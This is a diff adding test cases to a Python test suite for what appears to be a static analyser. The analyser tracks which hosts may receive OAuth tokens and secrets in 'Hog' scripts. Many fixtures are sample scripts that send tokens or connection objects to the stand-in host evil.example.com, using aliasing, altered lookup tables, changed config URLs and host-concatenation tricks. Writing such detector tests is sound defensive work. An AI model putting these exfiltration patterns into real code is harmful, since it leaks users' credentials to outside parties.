@@ -55,6 +55,24 @@ if (res.status >= 400) {
   throw Error(f'Webhook failed with status {res.status}: {res.body}');
 }
 """
+REGIONS_TABLE = "let regions := {'US': 'api.intercom.io', 'Europe': 'api.eu.intercom.io', 'AU': 'api.au.intercom.io'}"
+REGION_FETCH = (
+    "fetch(f'https://{regions[inputs.oauth['app.region']]}/contacts', "
+    "{'headers': {'Authorization': f'Bearer {inputs.oauth.access_token}'}})"
+)
+INTERCOM_REGIONS = f"{REGIONS_TABLE}\n{REGION_FETCH}"
+IN_EUROPE = {"app.region": "Europe"}
+SENDS_TO_TABLE_IN_EVENT = "fetch(event['event'], {'headers': {'Authorization': f'Bearer {inputs.oauth.access_token}'}})"
+SLACK_HOG = """
+let res := fetch('https://slack.com/api/chat.postMessage', {
+  'body': {'channel': inputs.channel},
+  'method': 'POST',
+  'headers': {'Authorization': f'Bearer {inputs.slack_workspace.access_token}', 'Content-Type': 'application/json'}
+});
+"""
+SENDS_INSTANCE_TOKEN = (
+    "fetch(f'{inputs.oauth.instance_url}/services/data', {'headers': {'Authorization': inputs.oauth.access_token}})"
+)
 
 
 def _inputs(**values: Any) -> dict[str, dict[str, Any]]:
@@ -428,6 +446,13 @@ class TestSecretHosts(SimpleTestCase):
             (
                 "secret_assigned_through_an_alias_and_printed",
                 "let h := {}\nlet a := h\na.Authorization := inputs.token\nprint(h)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "url_from_a_function_that_returns_nothing",
+                "fun missing() {}\nfetch(f'https://{missing()}evil.example.com/', {'body': inputs.token})",
                 _inputs(token="t"),
                 {"token"},
                 {"token": UNBOUND},
@@ -831,3 +856,168 @@ class TestSecretHosts(SimpleTestCase):
         message = secret_reentry_message("api_key", now, before, {"api_key": "API key", "target": "Webhook URL"})
 
         assert message == f"{expected} Enter it again to confirm."
+
+    @parameterized.expand(
+        [
+            ("template_host", SLACK_HOG, "slack_workspace", {}, _origins("https://slack.com")),
+            (
+                "token_sent_elsewhere",
+                "fetch('https://evil.example.com/a', {'body': inputs.slack_workspace.access_token})",
+                "slack_workspace",
+                {},
+                _origins("https://evil.example.com"),
+            ),
+            (
+                "raw_token_sent_elsewhere",
+                "fetch('https://evil.example.com/a', {'headers': {'X': inputs.slack_workspace.access_token_raw}})",
+                "slack_workspace",
+                {},
+                _origins("https://evil.example.com"),
+            ),
+            (
+                "key_named_by_a_constant",
+                "fetch('https://evil.example.com/a', {'body': 'slack_workspace'})",
+                "slack_workspace",
+                {},
+                frozenset(),
+            ),
+            (
+                "whole_connection_sent_elsewhere",
+                "let c := inputs.slack_workspace\nfetch('https://evil.example.com/a', {'body': c})",
+                "slack_workspace",
+                {},
+                _origins("https://evil.example.com"),
+            ),
+            (
+                "host_from_its_config",
+                SENDS_INSTANCE_TOKEN,
+                "oauth",
+                {"instance_url": "https://acme.my.salesforce.com"},
+                _origins("https://acme.my.salesforce.com"),
+            ),
+            ("host_missing_from_its_config", SENDS_INSTANCE_TOKEN, "oauth", {}, UNBOUND),
+            (
+                "host_from_a_constant_table",
+                INTERCOM_REGIONS,
+                "oauth",
+                IN_EUROPE,
+                _origins("https://api.eu.intercom.io"),
+            ),
+            ("constant_table_key_unknown", INTERCOM_REGIONS, "oauth", {}, UNBOUND),
+            ("constant_table_key_missing_from_the_table", INTERCOM_REGIONS, "oauth", {"app.region": "Mars"}, UNBOUND),
+            (
+                "constant_table_key_from_the_event_with_the_host_after_it",
+                f"{REGIONS_TABLE}\nfetch(f'https://{{regions[event.properties.region]}}/evil.example.com', "
+                "{'headers': {'Authorization': inputs.oauth.access_token}})",
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
+            ),
+            (
+                "constant_table_declared_in_a_block",
+                "if (false) { let event := {'event': 'https://slack.com/api/x'} }\n" + SENDS_TO_TABLE_IN_EVENT,
+                "oauth",
+                {},
+                UNBOUND,
+            ),
+            (
+                "constant_table_declared_in_a_function_body",
+                f"fun setup() {{\n{REGIONS_TABLE}\n}}\n{REGION_FETCH}",
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
+            ),
+            (
+                "constant_table_read_before_its_declaration",
+                f"{REGION_FETCH}\n{REGIONS_TABLE}",
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
+            ),
+            (
+                "constant_table_named_like_a_global",
+                "let event := {'event': 'https://slack.com/api/x'}\n" + SENDS_TO_TABLE_IN_EVENT,
+                "oauth",
+                {},
+                UNBOUND,
+            ),
+            (
+                "constant_table_declared_twice",
+                f"{REGIONS_TABLE}\nif (true) {{ let regions := {{'US': 'evil.example.com'}} }}\n{REGION_FETCH}",
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
+            ),
+            (
+                "constant_table_changed",
+                "regions['US'] := 'evil.example.com'\n" + INTERCOM_REGIONS,
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
+            ),
+            (
+                "options_built_elsewhere_for_another_fetch",
+                "let opts := {'method': 'POST'}\nfetch('https://evil.example.com/a', opts)\n" + SLACK_HOG,
+                "slack_workspace",
+                {},
+                _origins("https://slack.com"),
+            ),
+            (
+                "public_config_field_passed_to_any_call",
+                "let granted := replaceAll(inputs.slack_workspace.scope ?? '', ' ', '')\n"
+                "if (has(splitByString(',', granted), 'chat:write')) { print(inputs.slack_workspace['team.name']) }\n"
+                + SLACK_HOG,
+                "slack_workspace",
+                {"scope": "chat:write", "team.name": "Acme"},
+                _origins("https://slack.com"),
+            ),
+            (
+                "field_missing_from_the_public_config_printed",
+                SLACK_HOG + "print(inputs.slack_workspace.scope)",
+                "slack_workspace",
+                {},
+                UNBOUND,
+            ),
+            (
+                "token_printed",
+                SLACK_HOG + "print(inputs.slack_workspace.access_token)",
+                "slack_workspace",
+                {},
+                UNBOUND,
+            ),
+            (
+                "config_changed_through_an_alias",
+                "let c := inputs.oauth\nc.instance_url := 'https://evil.example.com'\n" + SENDS_INSTANCE_TOKEN,
+                "oauth",
+                {"instance_url": "https://acme.my.salesforce.com"},
+                UNBOUND,
+            ),
+            (
+                "constant_table_read_with_a_key_of_no_value",
+                "fun missing() {}\n"
+                + REGIONS_TABLE
+                + "\nfetch(f'https://{regions[missing()]}evil.example.com/', {'body': inputs.oauth.access_token})",
+                "oauth",
+                {},
+                _origins(
+                    "https://api.intercom.ioevil.example.com",
+                    "https://api.eu.intercom.ioevil.example.com",
+                    "https://api.au.intercom.ioevil.example.com",
+                    "https://evil.example.com",
+                ),
+            ),
+            (
+                "constant_table_aliased",
+                INTERCOM_REGIONS + "let other := regions\nother['US'] := 'evil.example.com'",
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
+            ),
+        ]
+    )
+    def test_integration_input_origins(
+        self, _name: str, hog: str, key: str, config: dict, expected: SecretOrigins
+    ) -> None:
+        inputs = {key: {"value": 1}, "channel": {"value": "C1"}}
+
+        assert secret_origins(hog, inputs, [], {key}, {key: config}) == {key: expected}
